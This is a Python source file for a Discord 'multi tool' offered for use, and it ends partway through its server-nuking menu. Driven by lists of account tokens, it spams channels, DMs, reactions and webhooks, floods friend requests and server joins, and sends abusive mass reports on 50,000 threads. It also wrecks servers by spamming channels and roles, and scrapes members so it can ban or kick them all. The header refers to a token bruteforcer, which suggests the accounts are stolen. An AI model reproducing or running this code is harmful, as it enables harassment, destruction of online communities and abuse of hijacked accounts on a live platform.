# Made by Lososik | https://github.com/Lososiik | https://dsc.gg/deadd
# You need to have tokens.txt at same folder, at tokens.txt put your own tokens. For token bruteforcer you need to create .txt file named grab.txt
# You need to write to cmd: pip install discord, pip install pyautoui, pip install requests, pip install websocket, pip install emoji, pip install json, pip intall base64, pip install colorama. Without it, the code will not work.
# © PussyKiller discord multi tool



#Copyright (c) 2021 Lososik

#Permission is hereby granted, free of charge, to any person
#obtaining a copy of this software and associated documentation
#files (the "Software"), to deal in the Software without
#restriction, including without limitation the rights to use,
#copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the
#Software is furnished to do so, subject to the following
#conditions:

#The above copyright notice and this permission notice shall be
#included in all copies or substantial portions of the Software.

#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
#EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
#OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
#NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
#HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
#WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
#FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
#OTHER DEALINGS IN THE SOFTWARE.



import threading
import colorama
from discord.ext import commands
import discord
import pyautogui
import time
from requests import post
from random import randint
import re
import http.client
import random
import json
import requests
from threading import Thread
from requests import Session
import base64
import string
import sys
from colorama import Fore
import os
import emoji as ej
import websocket
from os import system


title = 'PussyKiller'
system(f'title {title}')


def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text


def spammer():
    colorama.init()
    print('')
    print(f' {Fore.LIGHTMAGENTA_EX}╔═╗╔╦╗╔══╗╔══╗╔═╦╗     ╔╦╗╔══╗╔╗─╔╗─╔═╗╔═╗')
    print(f' ║╬║║║║║══╣║══╣╚╗║║     ║╔╝╚║║╝║║─║║─║╦╝║╬║')
    print(f' ║╔╝║║║╠══║╠══║╔╩╗║     ║╚╗╔║║╗║╚╗║╚╗║╩╗║╗╣{Fore.RESET}')
    print(f' {Fore.WHITE}╚╝─╚═╝╚══╝╚══╝╚══╝     ╚╩╝╚══╝╚═╝╚═╝╚═╝╚╩╝{Fore.RESET}')


    print(f" {Fore.LIGHTMAGENTA_EX}                           Made by Lososik{Fore.RESET}")
    print(f'{Fore.LIGHTMAGENTA_EX}╔══════════════════╦═══════════════════════╗{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Spammer       {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[9]{Fore.RESET} Webhook Spammer    {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} DM Spammer    {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[10]{Fore.RESET} Reaction Spammer  {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[3]{Fore.RESET} Friend Spammer{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[11]{Fore.RESET} Server Nuker      {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[4]{Fore.RESET} Joiner        {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[12]{Fore.RESET} Account Nuker     {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[5]{Fore.RESET} Leaver        {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[13]{Fore.RESET} Send Tokens Online{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[6]{Fore.RESET} Typing Spammer{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[14]{Fore.RESET} Token Bruteforce  {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[7]{Fore.RESET} Tokens Checker{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[15]{Fore.RESET} About             {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[8]{Fore.RESET} MassReport    {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[16]{Fore.RESET} Exit              {Fore.LIGHTMAGENTA_EX}║{Fore.RESET}')
    print(f'{Fore.LIGHTMAGENTA_EX}╚══════════════════╩═══════════════════════╝{Fore.RESET}')
    choice = int(input('[?]>'))


    if choice == 1:
        tokens = open("tokens.txt", "r").read().splitlines()
        channel = input(f'Chanel ID: ')
        mess = input(f'Message: ')
        delay = float(input(f'Delay: '))

        def spam(token, mess):
            url = 'https://discord.com/api/v9/channels/' + channel + '/messages'
            data = {"content": mess}
            header = {"authorization": token}

            while True:
                time.sleep(delay)
                src = requests.post(url, data, headers=header)
                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for", str(float(ratelimit['retry_after'])) + " seconds")
                    time.sleep(float(ratelimit['retry_after']))

                elif src.status_code == 200:
                    print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{mess} sent')

                elif src.status_code == 401:
                    print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token')
                elif src.status_code == 404:
                    print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Not found ¯\_(ツ)_/¯')
                elif src.status_code == 403:
                    print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}Token havent got access to this channel')

        def thread():
            text = mess
            for token in tokens:
                threading.Thread(target=spam, args=(token, text)).start()

        start = input(f'Press eny key to start: ')
        start = thread()

        time.sleep(5)
        exit = input(f'press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 2:
        def DMSpammer(idd, message, token):
            header = {
                'Authorization': token,
                "accept": "*/*",
                "accept-language": "en-GB",
                "content-length": "90",
                "content-type": "application/json",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }

            payload = {'recipient_id': idd}
            r1 = requests.post(f'https://discordapp.com/api/v9/users/@me/channels', headers=header,
                               json=payload)

            payload = {"content": message, "tts": False}
            j = json.loads(r1.content)

            while True:
                r2 = requests.post(f"https://discordapp.com/api/v9/channels/{j['id']}/messages",
                                   headers=header, json=payload)

                if r2.status_code == 429:
                    ratelimit = json.loads(r2.content)
                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Ratelimit for", str(float(ratelimit['retry_after'])) + " seconds")
                    time.sleep(float(ratelimit['retry_after']))

                elif r2.status_code == 200:
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}DM sent to {idd}!")


        tokens = open("tokens.txt", "r").read().splitlines()
        user = input(f"User ID: ")
        message = input(f"Message: ")

        def thread():
            for token in tokens:
                threading.Thread(target=DMSpammer, args=(user, message, token)).start()

        start = input(f'Press enter to start: ')
        start = thread()

        time.sleep(5)
        exit = input(f'press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 3:
        def friender(token, user):
            try:
                user = user.split("#")
                headers = {
                    "accept": "*/*",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "en-GB",
                    "authorization": token,
                    "content-length": "90",
                    "content-type": "application/json",
                    "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                    "origin": "https://discord.com",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                    "x-debug-options": "bugReporterEnabled",
                    "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
                }
                payload = {"username": user[0], "discriminator": user[1]}
                src = requests.post('https://canary.discordapp.com/api/v6/users/@me/relationships', headers=headers,
                                    json=payload)
                if src.status_code == 204:
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}Friend request sent to {user[0]}#{user[1]}!")
            except Exception as e:
                print(e)

        user = input(f"Username + Tag: ")
        tokens = open("tokens.txt", "r").read().splitlines()
        delay = float(input(f'Delay: '))
        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=friender, args=(token, user)).start()


        time.sleep(5)
        exit = input(f'press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 4:

        http.client._is_legal_header_name = re.compile(rb'[^\s][^:\r\n]*').fullmatch


        tokens = open("tokens.txt", "r").read().splitlines()


        def join(invite, token):  # with this code help me my friend H0LLOW
            token = token.replace("\r", "")
            token = token.replace("\n", "")
            headers = {
                ":authority": "canary.discord.com",
                ":method": "POST",
                ":path": "/api/v9/invites/" + invite,
                ":scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "Authorization": token,
                "content-length": "0",
                "cookie": "__dcfduid=75af9050ff6211ebad731ffdee3c037e; __sdcfduid=75af9051ff6211ebad731ffdee3c037e933998e6356b1dffdf296486c9c67f3f52108589d44d26d29febc86909e52537; __stripe_mid=b1d29ec9-19c8-41d7-9ace-e35266d8e9d1725cd3; __cfruid=402026f51d740991320e719ec5b87763fb9f0b58-1630164866",
                "origin": "https://canary.discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            }
            requests.post("https://discordapp.com/api/v9/invites/" + invite, headers=headers)


        invite = input(f"Discord server invite: ")
        invite = invite.replace("https://discord.gg/", "")
        invite = invite.replace("discord.gg/", "")
        invite = invite.replace("https://discord.com/invite/", "")

        delay = float(input(f'Delay: '))


        for token in tokens:
            time.sleep(delay)
            threading.Thread(target=join, args=(invite, token)).start()


        print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET} Done')

        time.sleep(5)
        exit = input(f'press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 5:

        token = open("tokens.txt", "r").read().splitlines()

        ID = input(f'Discord Server ID: ')

        apilink = "https://discordapp.com/api/v9/users/@me/guilds/" + str(ID)

        with open('tokens.txt', 'r') as handle:
            tokens = handle.readlines()
            for i in tokens:
                token = i.rstrip()
                headers = {
                    'Authorization': token
                }
                requests.delete(apilink, headers=headers)
            print(f'{Fore.GREEN}[+]{Fore.RESET} Successfully left guild')

        time.sleep(5)
        exit = input(f'press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 6:

        message = input("Message: ")
        amount = int(input("Amount of messages: "))
        delay = float(input('Delay: '))


        ready = input("Press enter when you will be ready: ")


        print(f"{Fore.LIGHTMAGENTA_EX}10 seconds to typing spam{Fore.RESET}")


        for seconds in range(10, 0, -1):
            print(seconds)
            time.sleep(1)
        print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Spamming')


        for i in range(0, amount):
            if message != "":
                pyautogui.typewrite(message)
                pyautogui.press("enter")
            else:
                pyautogui.hotkey("ctrl", "v")
                pyautogui.press("enter")

            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET}{message} sent')
            time.sleep(delay)


        print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Done\n")

        time.sleep(5)
        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 7:

        def checker(token):
            response = post(f'https://discord.com/api/v6/invite/{randint(1, 9999999)}',
                            headers={'Authorization': token})
            if "You need to verify your account in order to perform this action." in str(
                    response.content) or "401: Unauthorized" in str(response.content):
                return False
            elif response.status_code == 401:
                return 'Invalid'
            else:
                return True


        def manager():
            if __name__ == "__main__":
                try:
                    checked = []
                    with open('tokens.txt', 'r') as tokens:
                        for token in tokens.read().split('\n'):
                            if len(token) > 15 and token not in checked and checker(token) == True:
                                print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{token} Valid')
                                checked.append(token)
                            else:
                                print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}{token} Invalid')
                    if len(checked) > 0:
                        save = input(f'{len(checked)} Valid\nDo you want to Save only Valid tokens? (y/n): ').lower()
                        if save == 'y':
                            name = 'tokens'
                            with open(f'{name}.txt', 'w') as saveFile:
                                saveFile.write('\n'.join(checked))
                            print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Tokens saved to {name}.txt file!')
                except:
                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error, cant open tokens.txt file...... :(!')


        start = input('press any key to start: ')
        start = manager()

        time.sleep(5)
        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()



    if choice == 8:

        sent = 0
        session = Session()
        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Illegal Content')
        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Harrassment')
        print(f'{Fore.LIGHTMAGENTA_EX}[3]{Fore.RESET} Spam or Phishing Links')
        print(f'{Fore.LIGHTMAGENTA_EX}[4]{Fore.RESET} Self harm')
        print(f'{Fore.LIGHTMAGENTA_EX}[5]{Fore.RESET} NSFW Content')


        tokeen = input("Token: ")
        headers = {'Authorization': tokeen, 'Content-Type': 'application/json'}
        r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
        if r.status_code == 200:
            pass
        else:
            print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Invalid Token{Fore.RESET}")
            input()
        id = input("Server ID: ")
        id1 = input("Channel ID: ")
        message = input("Message ID: ")
        reason = input("Option: ")


        def Main():
            global sent
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
                'Authorization': tokeen,
                'Content-Type': 'application/json'
            }


            payload = {
                'channel_id': id1,
                'guild_id': id,
                'message_id': message,
                'reason': reason
            }


            while True:
                sent = 0
                r = requests.post('https://discord.com/api/v6/report', headers=headers, json=payload)
                if r.status_code == 201:
                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Sent Report{Fore.RESET}")
                    sent += 1


                elif r.status_code == 401:
                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Invalid token")
                    input()


                else:
                    print(f"{Fore.LIGHTRED_EX}[-] {Fore.RESET}Error")


        print()
        for i in range(50000):
            Thread(target=Main).start()

        time.sleep(5)
        exit = input('press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()




    if choice == 9:

        def webhkspammer():
            webhook = input("Webhook Link: ")
            message = input("Message: ")
            delay = float(input("Delay: "))

            while True:
                try:
                    time.sleep(delay)
                    _data = requests.post(webhook, json={'content': message})

                    if _data.status_code == 204:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{message} sent")
                except:
                    print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error, or wrong webhook: {Fore.LIGHTRED_EX}{webhook}{Fore.RESET}")
                    time.sleep(5)


        def thread():
            threading.Thread(target=webhkspammer(), args=(message)).start()

        thread()


        time.sleep(5)
        exit = input(f'press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 10:
        def reaction(chd, iddd, start, org, token):
            headers = {'Content-Type': 'application/json',
                       'Accept': '*/*',
                       'Accept-Encoding': 'gzip, deflate, br',
                       'Accept-Language': 'en-US',
                       'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                       'DNT': '1',
                       'origin': 'https://discord.com',
                       'TE': 'Trailers',
                       'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                       'authorization': token,
                       'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
                       }

            emoji = ej.emojize(org, use_aliases=True)
            if start == '':
                a = requests.put(
                    f"https://discordapp.com/api/v6/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
                    headers=headers)
                if a.status_code == 204:
                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Reaction {org} added! ")
                else:
                    print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error")

            else:
                print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} ERROR, press only ENTER')

        tokens = open('tokens.txt', 'r').read().splitlines()
        chd = input('Channel ID: ')
        iddd = input('Message ID: ')
        emoji = input('Emoji: ')
        start = input("Press ENTER to start: ")
        for token in tokens:
            threading.Thread(target=reaction, args=(chd, iddd, start, emoji, token)).start()

        time.sleep(5)
        exit = input(f'press any key: ')
        clear = lambda: os.system('cls')
        exit = clear()
        exit = spammer()


    if choice == 11:

        max_roles = 500
        maxChannels = 500


        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Account server Nuker')
        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Bot server Nuker')


        choicee1 = int(input('[?]>'))


        if choicee1 == 1:
            token = input('Account Token: ')
            print(f'{Fore.LIGHTMAGENTA_EX}[1] {Fore.RESET}Nuker')
            print(f'{Fore.LIGHTMAGENTA_EX}[2] {Fore.RESET}MassBan/MassKick')
            choicr = int(input('[?]>'))


            if choicr == 1:

                intents = discord.Intents.all()
                intents.members = True

                headerrs = {'Authorization': f'{token}',
                            "accept": "*/*",
                            'origin': 'https://discord.com',
                            'sec - fetch - mode': 'cors',
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            'sec - fetch - site': 'same - origin',
                            'x - debug - options': 'bugReporterEnabled',
                            'x - super - properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAyMTEzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ =='
                            }
                client = commands.Bot(command_prefix="!", case_insensitive=False, self_bot=True, intents=intents)

                class UNuker:
                    def SpamChannels(self, guild, name):
                        while True:
                            json = {'name': name, 'type': 0}
                            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headerrs,
                                              json=json)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Created Channel ")
                                    break
                                else:
                                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant create channels')

                    def SpamRoles(self, guild, name):
                        while True:
                            json = {'name': name}
                            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headerrs,
                                              json=json)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Created Role ")
                                    break
                                else:
                                    print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} You cant create roles')
                                    break

                    async def NukeStart(self):
                        server = input(f'Server ID: ')
                        chh = input(f"Channels Names: ")
                        cha = input(f"Channels Amount: ")
                        rn = input(f"Roles Names: ")
                        ra = input(f"Roles Amount: ")

                        for i in range(int(cha)):
                            threading.Thread(target=self.SpamChannels, args=(server, chh,)).start()
                        for i in range(int(ra)):
                            threading.Thread(target=self.SpamRoles, args=(server, rn,)).start()

                    async def Menu(self):
                        choice = input('Press Enter: ')
                        if choice == '':
                            await self.NukeStart()
                            time.sleep(2)
                            await self.Menu()

                    @client.event
                    async def on_ready(*Args):
                        await UNuker().Menu()

                    def Check(self):
                        try:
                            client.run(token, bot=False)
                        except:
                            print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} Invalid Token ')
                            input()
                            os._exit(0)

                if __name__ == "__main__":
                    UNuker().Check()

                time.sleep(5)
                exit = input('press any key: ')
                clear = lambda: os.system('cls')
                exit = clear()
                exit = spammer()
            if choicr == 2:
                print(f'{Fore.LIGHTRED_EX}Warning!{Fore.RESET} If you use MassBan or MassKick with a token where the mobile number is not verified, the token will be locked automatically and you will have to verify it.')

                intents = discord.Intents.all()
                intents.members = True

                headerrss = {'Authorization': f'{token}',
                            "accept": "*/*",
                            'origin': 'https://discord.com',
                            'sec - fetch - mode': 'cors',
                            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                            'sec - fetch - site': 'same - origin',
                            'x - debug - options': 'bugReporterEnabled',
                            'x - super - properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjIwMDAiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTAyMTEzLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ =='
                            }
                client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)

                client.remove_command("help")

                class MassBan:

                    def BanMembers(self, guild, member):
                        while True:
                            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}",
                                             headers=headerrss)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Banning {member}")
                                    break
                                else:
                                    break

                    def KickMembers(self, guild, member):
                        while True:
                            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}",
                                                headers=headerrss)
                            if 'retry_after' in r.text:
                                time.sleep(r.json()['retry_after'])
                            else:
                                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                                    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Kicking {member}')
                                    break
                                else:
                                    break

                    async def Scrape(self):
                        guild = input(f'Server ID: ')
                        await client.wait_until_ready()
                        guildOBJ = client.get_guild(int(guild))
                        members = await guildOBJ.chunk()

                        try:
                            os.remove("N/members.txt")
                        except:
                            pass

                        membercount = 0
                        with open('N/members.txt', 'a') as m:
                            for member in members:
                                m.write(str(member.id) + "\n")
                                membercount += 1
                            print(f"Info: {membercount} Members")
                            m.close()



                    async def BanExecute(self):
                        guild = input(f'Server ID: ')
                        print()
                        members = open('N/members.txt')
                        for member in members:
                            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
                        members.close()

                    async def KickExecute(self):
                        guild = input(f'Server ID: ')
                        print()
                        members = open('N/members.txt')
                        for member in members:
                            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
                        members.close()

                    async def Menu(self):
                        print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} MassBan')
                        print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} MassKick')

                        choice = input(f'[?]>')
                        if choice == '1':
                            await self.Scrape()
                            time.sleep(3)
                            sure = input('MassBAN y/n?: ').lower()
                            if sure == 'y':
                                await self.BanExecute()
                                time.sleep(2)
                                await self.Menu()

                            if sure == 'n':
                                exit = input('press any key: ')
                                clear = lambda: os.system('cls')
                                exit = clear()
                                exit = spammer()

                        elif choice == '2':
                            await self.Scrape()
                            time.sleep(3)
                            sure = input('MassKick y/n?: ').lower()
                            if sure == 'y':
                                await self.KickExecute()
                                time.sleep(2)
                                await self.Menu()
                            if sure == 'n':
                                exit = input('press any key: ')
                                clear = lambda: os.system('cls')
                                exit = clear()
                                exit = spammer()


                    @client.event
                    async def on_ready(*args):
                        await MassBan().Menu()

                    def Startup(self):
                        try:
                            client.run(token, bot=False)


                        except:
                            print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} Invalid Token')
                            time.sleep(2)
                            exit = input('press any key: ')
                            clear = lambda: os.system('cls')
                            exit = clear()
                            exit = spammer()


                if __name__ == "__main__":
                    MassBan().Startup()

                time.sleep(5)
                exit = input('press any key: ')
                clear = lambda: os.system('cls')
                exit = clear()
                exit = spammer()


        if choicee1 == 2:
            TOKEN = input('Bot token: ')
            MAX_CHANNELS = 500
            print(f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Nuke')
            print(f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} MassBan')


            choicee = int(input('[?]>'))


            if choicee == 1:
                chanless = input('Channels names: ')
                spam = input('Message you wanna spam: ')
                print(f'{Fore.LIGHTMAGENTA_EX}For nuke write to chat: !Nuke{Fore.RESET}')


            if choicee == 2:
                reason = input('Bans reason: ')
